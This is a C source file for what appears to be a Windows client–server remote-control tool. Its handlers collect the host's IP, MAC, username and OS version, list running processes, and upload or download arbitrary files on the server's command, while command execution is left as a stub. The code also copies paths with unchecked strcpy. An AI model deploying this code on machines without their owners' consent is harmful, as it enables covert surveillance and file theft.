#include "commands.h"

BOOL ClientCommandGetInfo(struct Connection* conn)
{
	struct systemInfo info;
	getInformation(&info);
	return SendData(conn, CommandResponse, &info, sizeof(struct systemInfo));
}

BOOL ServerCommandGetInfo(struct Connection* conn)
{
	BOOL result = FALSE;
	if (SendData(conn, GetInformation, NULL, 0))
	{
		if (QueueWaitForElement(conn->messages, INFINITE))
		{
			struct MainHeader * response = QueuePopFifo(conn->messages, NULL);
			struct systemInfo* information = ((char*)response + sizeof(struct MainHeader));
			printf("THE ADDR %lx\n", (unsigned long)response);
			struct in_addr addr;
			addr.S_un.S_addr = (unsigned long)information->ipAddr;
			char* ipaddr = inet_ntoa(addr);
			printf("IP Address: %s\n", ipaddr);
			printf("MAC Address: %.2x-%.2x-%.2x-%.2x-%.2x-%.2x\n", information->macAddr[0] & 0xFF, information->macAddr[1] & 0xFF, information->macAddr[2] & 0xFF, information->macAddr[3] & 0xFF, information->macAddr[4] & 0xFF, information->macAddr[5] & 0xFF);
			printf("Current Username: %s\n", information->userName);
			printf("Current OS: ");
			switch (information->dwMajorVersion)
			{
			case 10:
				if (information->wProductType == VER_NT_WORKSTATION)
				{
					printf("Windows 10\n");
				}
				else
				{
					printf("Windows Server 2016\n");
				}
				break;
			case 6:
				switch (information->dwMinorVersion)
				{
				case 3:
					if (information->wProductType == VER_NT_WORKSTATION)
					{
						printf("Windows 8.1\n");
					}
					else
					{
						printf("Windows Server 2012 R2\n");
					}
					break;
				case 2:
					if (information->wProductType == VER_NT_WORKSTATION)
					{
						printf("Windows 8\n");
					}
					else
					{
						printf("Windows Server 2012\n");
					}
					break;
				case 1:
					if (information->wProductType == VER_NT_WORKSTATION)
					{
						printf("Windows 7\n");
					}
					else
					{
						printf("Windows Server 2008 R2\n");
					}
					break;
				case 0:
					if (information->wProductType == VER_NT_WORKSTATION)
					{
						printf("Windows Vista\n");
					}
					else
					{
						printf("Windows Server 2008\n");
					}
					break;
				default:
					printf("Unknown OS\n");
				}

				break;
			case 5:
				switch (information->dwMinorVersion)
				{
				case 2:
					printf("Windows Server 2003\n");
					break;
				case 1:
					printf("Windows XP\n");
					break;
				case 0:
					printf("Windows 2000\n");
					break;
				default:
					printf("Unknown OS\n");
				}
				break;
			default:
				printf("Unknown OS\n");
			}
			result = TRUE;
			HeapFree(GetProcessHeap(), 0, response);
		}


	}

	return result;
}

BOOL ServerCommandExecuteCommand(struct Connection* conn)
{
	return FALSE;
}

BOOL ClientCommandExecuteCommand(struct Connection* conn)
{
	return FALSE;
}

BOOL ServerCommandListProcesses(struct Connection* conn)
{
	struct MainHeader* response = NULL;
	SendData(conn, ProcessListRequest, NULL, 0);
	while (QueueWaitForElement(conn->messages, INFINITE))
	{
		response = QueuePopFifo(conn->messages, NULL);
		if (response->type == ProcessListEnd || response->type != ProcessListEntry)
		{
			HeapFree(GetProcessHeap(), 0, response);
			break;
		}


		struct ProcessInformation* info = ((char*)response + sizeof(struct MainHeader));
		wprintf(L"PID: %d - EXE: %s\n", info->pid, info->filePath);
		HeapFree(GetProcessHeap(), 0, response);
	}
	return TRUE;
}

BOOL ClientCommandListProcesses(struct Connection* conn)
{
	if (!SendData(conn, ProcessListStart, NULL, 0))
	{
		return FALSE;
	}
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	PROCESSENTRY32 entry;
	struct ProcessInformation info;
	BOOL result = Process32First(snapshot, &entry);
	if (result)
	{
		do
		{
			wcscpy(info.filePath, entry.szExeFile);
			info.pid = entry.th32ProcessID;
			SendData(conn, ProcessListEntry, &info, sizeof(struct ProcessInformation));
		} while (Process32Next(snapshot, &entry));

		SendData(conn, ProcessListEnd, NULL, 0);
		CloseHandle(snapshot);
		return TRUE;
	}

	CloseHandle(snapshot);
	return FALSE;
}

BOOL ServerCommandUploadFile(struct Connection* conn, char * from, char * to)
{
	HANDLE file = CreateFileA(from, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD size = GetFileSize(file, NULL);
	char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(char) * (sizeof(struct UploadDownloadRequest) + size));
	if (!buffer)
	{
		CloseHandle(file);
		return FALSE;
	}
	DWORD read = 0;
	if (!ReadFile(file, buffer + sizeof(struct UploadDownloadRequest), size, &read, NULL))
	{
		CloseHandle(file);
		printf("heapfree4 %lx\n", (unsigned long)buffer);

		HeapFree(GetProcessHeap(), 0, buffer);
		return FALSE;
	}

	struct UploadDownloadRequest request;
	strcpy(request.path, to);
	request.upload = TRUE;
	request.filesize = size;
	memcpy(buffer, &request, sizeof(struct UploadDownloadRequest));
	BOOL result = SendData(conn, ClientUploadFile, buffer, sizeof(struct UploadDownloadRequest) + size);
	CloseHandle(file);

	HeapFree(GetProcessHeap(), 0, buffer);
	return result;
}

BOOL ClientCommandUploadFile(struct Connection * conn, struct MainHeader * request)
{
	struct UploadDownloadRequest* second = ((char*)request + sizeof(struct MainHeader));
	if (second->upload)
	{
		char* buffer = ((char*)second + sizeof(struct UploadDownloadRequest));
		HANDLE hFile = CreateFileA(second->path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			DWORD written = 0;
			if (WriteFile(hFile, buffer, second->filesize, &written, NULL))
			{
				CloseHandle(hFile);
				return TRUE;
			}

			CloseHandle(hFile);
		}
	}

	return FALSE;
}

BOOL ServerCommandDownloadFile(struct Connection* conn, char * from, char * to)
{
	struct UploadDownloadRequest req;
	req.filesize = 0;
	strcpy(req.path, from);
	req.upload = FALSE;
	BOOL result = FALSE;
	if (SendData(conn, ClientDownloadFile, &req, sizeof(struct UploadDownloadRequest)))
	{
		struct MainHeader* response = NULL;

		if (QueueWaitForElement(conn->messages, INFINITE))
		{
			response = QueuePopFifo(conn->messages, NULL);
			if (response->type == CommandResponse)
			{
				char* buffer = ((char*)response + sizeof(struct MainHeader));
				HANDLE hFile = CreateFileA(to, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (hFile != INVALID_HANDLE_VALUE)
				{
					DWORD written = 0;
					if (WriteFile(hFile, buffer, response->totalSize, &written, NULL))
					{
						result = TRUE;
					}
					CloseHandle(hFile);
				}
			}

			HeapFree(GetProcessHeap(), 0, response);
		}
	}

	return result;
}

BOOL ClientCommandDownloadFile(struct Connection* conn, struct MainHeader * request)
{
	struct UploadDownloadRequest* req = ((char*)request + sizeof(struct MainHeader));
	HANDLE hFile = CreateFileA(req->path, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	BOOL result = FALSE;
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD size = GetFileSize(hFile, NULL);
		char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
		if (buffer)
		{
			DWORD read = 0;
			if (ReadFile(hFile, buffer, size, &read, NULL))
			{
				result = SendData(conn, CommandResponse, buffer, size);
			}

			HeapFree(GetProcessHeap(), 0, buffer);
		}

		CloseHandle(hFile);
	}

	return result;
} 